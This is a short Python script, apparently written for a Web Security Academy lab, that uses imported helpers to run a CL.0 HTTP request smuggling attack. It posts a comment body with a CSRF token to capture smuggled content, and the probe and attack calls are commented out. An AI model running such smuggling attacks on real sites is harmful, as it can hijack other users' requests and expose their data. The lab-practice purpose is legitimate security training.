from smuggler_utils import get_cl_0_content_post,cl_0_probe,cl_0_attack

hostname = "0a4400f50362e8ccc24767c900e30031.web-security-academy.net"
url = '/' 
attack_url = '/en/post/comment'
params="csrf=kyliyz4FSGOnv7XtFI0ac2BBtq4rUTkj&postId=4&name=sdasdas&email=ee%40ee.ro&website=http%3A%2F%2Fwww.gg.ll&comment="
print(get_cl_0_content_post(hostname,url,params,attack_url))

#if cl_0_probe(hostname,url):
#    print("vulnerable")
    #val = cl_2_attack(hostname,url,attack_url)



